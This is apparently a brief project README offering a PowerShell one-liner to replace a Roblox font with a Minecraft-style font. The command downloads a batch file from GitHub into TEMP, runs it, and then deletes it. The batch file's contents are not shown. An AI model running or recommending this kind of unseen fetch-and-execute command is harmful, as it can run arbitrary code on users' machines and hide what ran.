Simple PowerShell command to replace a Roblox font file to the Minecraft font.

**Run the following command in PowerShell:**

```powershell
Invoke-WebRequest -Uri "https://github.com/lopezcc/rbx-font/raw/main/replace.bat" -OutFile "$env:TEMP\replace.bat"; Start-Process -FilePath "$env:TEMP\replace.bat" -Wait; Remove-Item -Path "$env:TEMP\replace.bat" -Force
